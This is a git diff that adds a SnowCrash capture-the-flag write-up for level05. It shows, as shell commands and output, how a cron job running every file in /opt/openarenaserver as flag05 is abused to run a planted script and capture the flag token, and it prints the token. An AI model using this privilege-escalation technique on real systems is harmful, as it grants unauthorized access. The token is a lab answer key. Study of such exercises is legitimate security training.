@@ -1,0 +1,47 @@
+# When connecting to level05, they inform us that we have a new mail
+You have new mail.
+
+# I read it
+
+level05@SnowCrash:~$ cat /var/mail/$(whoami)
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+# First part looks like a cronjob executed as flag05 user :) :)
+====================================================================
+# Let's analyse the file mentioned
+
+level05@SnowCrash:~$ file /usr/sbin/openarenaserver
+/usr/sbin/openarenaserver: POSIX shell script, ASCII text executable
+
+level05@SnowCrash:~$ /usr/sbin/openarenaserver
+-bash: /usr/sbin/openarenaserver: Permission denied
+
+level05@SnowCrash:~$ sh /usr/sbin/openarenaserver
+bash: /opt/openarenaserver/*: No such file or directory
+
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+====================================================================
+# Ok, my first guess is that we have to create files in /opt/openarenaserver
+	so our command will be executed.
+# We have to execute this via the cronjob so we can print the flag
+
+# Lets create a flag file in tmp and give all permissions so user flag05
+	will be able to write in it
+
+level05@SnowCrash:/opt/openarenaserver$ touch /tmp/flag
+level05@SnowCrash:/opt/openarenaserver$ chmod 777 /tmp/flag
+level05@SnowCrash:/opt/openarenaserver$ ls -l /tmp/flag
+-rwxrwxrwx 1 level05 level05 89 Aug  1 16:51 /tmp/flag
+
+# Now create our script and wait 2min until its executed
+echo "/bin/getflag > /tmp/flag" > /opt/openarenaserver/script.sh
+
+# Done :)
+level05@SnowCrash:/opt/openarenaserver$ cat /tmp/flag
+Check flag.Here is your token : viuaaale9huek52boumoomioc
